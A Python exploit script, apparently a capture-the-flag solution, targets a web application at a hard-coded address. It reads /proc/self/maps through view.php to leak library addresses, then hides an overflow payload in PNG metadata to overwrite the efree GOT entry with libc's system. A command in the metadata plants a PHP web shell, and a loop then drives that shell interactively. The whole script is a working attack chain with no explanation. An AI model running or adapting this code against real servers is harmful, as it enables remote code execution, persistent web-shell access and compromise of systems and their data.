from PIL import Image, PngImagePlugin
from pwn import *
import requests
from bs4 import BeautifulSoup

URL = "http://154.57.164.74:31074"

def create_png(filename, artist="", title="", copyright_text=""):
    img = Image.new("RGB", (200, 200), color=(255, 255, 255))

    meta = PngImagePlugin.PngInfo()

    if title:
        meta.add_text("Title", title)

    if artist:
        meta.add_text("Artist", artist)

    if copyright_text:
        meta.add_text("Copyright", copyright_text)

    img.save(filename, "PNG", pnginfo=meta)

    success(f"Created {filename}")

def get_base(maps_text, target):
    for line in maps_text.splitlines():
        if target in line:
            addr = line.split(" ")[0]
            base = int(addr.split("-")[0], 16)
            return base
    return None

def leak_address():
    html = requests.get(URL + "/view.php?image=/proc/self/maps")
    soup = BeautifulSoup(html.text, "html.parser")
    img = soup.find("img")
    data = img["src"]
    b64 = data.split("base64,")[1]
    data = base64.b64decode(b64).decode()
    metareader_base = get_base(data, "/app/metadata_reader.so")
    libc_base = get_base(data, "/usr/lib/x86_64-linux-gnu/libc.so.6")
    if metareader_base:
        success(f"Found metadata_reader.so base: {hex(metareader_base)}")
    if libc_base:
        success(f"Found libc.so.6 base: {hex(libc_base)}")
    return metareader_base, libc_base

metareader_base, libc_base = leak_address()

efree_got = metareader_base + 0x4090
system = libc_base + 0x4c3a0

success(f"efree GOT address: {hex(efree_got)}")
success(f"system address: {hex(system)}")

command = b"echo '<?php system($_GET[0]); ?>' > /app/uploads/me.php"
payload = b"A"*0x38 + p64(efree_got)

create_png(
    "exploit.png",
    artist=command,
    title=payload,
    copyright_text=p64(system)
)

files = {
    "file": ("exploit.png", open("exploit.png", "rb"), "image/png")
}

r = requests.post(URL + "/upload.php", files=files)
if r.status_code == 200:
    success("Exploit executed successfully!")
else:
    error("File upload failed!")
    exit(1)

while True:
    cmd = input("$ ")
    if cmd.lower() == "exit":
        break
    r = requests.get(URL + f"/uploads/me.php?0={cmd}")
    print(r.text)

